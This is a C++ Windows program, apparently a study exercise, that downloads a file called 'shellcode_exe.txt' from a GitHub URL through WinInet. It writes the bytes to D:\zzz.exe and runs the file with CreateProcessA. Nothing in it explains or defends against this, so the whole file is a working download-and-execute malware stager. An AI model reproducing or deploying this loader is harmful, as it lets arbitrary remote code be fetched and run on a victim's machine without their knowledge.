#pragma comment(lib, "wininet")
#include<Windows.h>
#include<WinInet.h>

#include <fstream>
#include<iostream>
using namespace std;

DWORD down_file(PBYTE& pByte, DWORD size) {
	if (!InternetCheckConnectionA((LPCSTR)"https://www.google.com/", FLAG_ICC_FORCE_CONNECTION, 0)) {
		cout << "I need Internet\n";
		return NULL;
	}
	LPCSTR  url = "https://github.com/A22H67/Study/raw/main/shellcode_exe.txt";
	//tells the Internet DLL to initialize internal data structures
	//and prepare for future calls from the application
	HINTERNET internet_handle = InternetOpenA((LPCSTR)"Mozilla",
		INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	if (!internet_handle) {
		cout << "Err InternetOpenA:" << GetLastError() << '\n';
		return NULL;

	}
	HINTERNET url_handle = InternetOpenUrlA(internet_handle, url, 0, 0,
		INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTH, 0
	);
	if (!url_handle) {
		cout << "Err InternetOpenUrlA:" << GetLastError() << '\n';
		InternetCloseHandle(internet_handle);
		return NULL;
	}


	PBYTE byte = pByte;
	DWORD byteRead;
	int count = 0;
	
	while (1) {
		if (count >= size) {
			break;
		}
		
		memset(byte, 0, 1024);
		if (!InternetReadFile(url_handle, byte, 1024, &byteRead)) {
			cout << "count:" << count << '\n';
			cout << "Err InternetReadFile:" << GetLastError() << '\n';
			InternetCloseHandle(url_handle);
			InternetCloseHandle(internet_handle);
			return NULL;
		}
		if (byteRead == 0) {
			cout << "byteRead:" << byteRead << "  getlastErr:" << GetLastError() << '\n';
			break;
		}
		byte = (byte + byteRead);
		count += byteRead;
	}//end while

	
	InternetCloseHandle(url_handle);
	InternetCloseHandle(internet_handle);
	
	return 1;
}
int main() {
	ofstream ost{"D:\\zzz.exe",ios_base::binary };
	if (!ost) cout <<"can't open output file \n";
	
	DWORD size = 131355;
	BYTE* shellcode = new BYTE[size+1];
	if (!down_file(shellcode, size)) {
		cout << "Err down file\n";
		return 0;
	}


	for (int i = 0; i <= size; i++) {
		char c = shellcode[i];
		ost << c;//write to file 
	}
	ost.close();
	LPCSTR target_app = "D:\\zzz.exe";

	LPSTARTUPINFOA target_start_info = new STARTUPINFOA();
	LPPROCESS_INFORMATION target_process_information = new PROCESS_INFORMATION();
	if (!CreateProcessA(target_app, NULL, NULL, NULL, FALSE, 0, NULL, NULL,
		target_start_info, target_process_information)) {
		cout << "Can't create process:"<<GetLastError()<<'\n';
		return 1;
	}
	return 0;
	
}
